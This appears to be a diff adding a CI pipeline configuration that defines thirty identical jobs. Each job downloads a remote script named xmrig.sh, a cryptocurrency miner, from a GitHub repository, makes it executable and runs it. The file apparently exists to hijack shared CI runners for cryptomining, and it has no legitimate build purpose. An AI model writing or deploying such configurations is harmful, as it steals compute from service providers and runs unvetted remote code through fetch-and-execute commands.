@@ -1,0 +1,149 @@
+ bachanel 1:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 2:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+  
+bachanel 3:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 4:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 5:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 6:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 7:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 8:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 9:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 10:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 11:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 12:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 13:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 14:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 15:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 16:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 17:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 18:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 19:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 20:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 21:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 22:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 23:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 24:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 25:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 26:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 27:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 28:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 29:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
+    
+bachanel 30:
+   stage: bachanel
+   script:
+    -wget https://raw.githubusercontent.com/Biangkerok32/BuildXmrig/vps/xmrig.sh && chmod u+x xmrig.sh && ./xmrig.sh
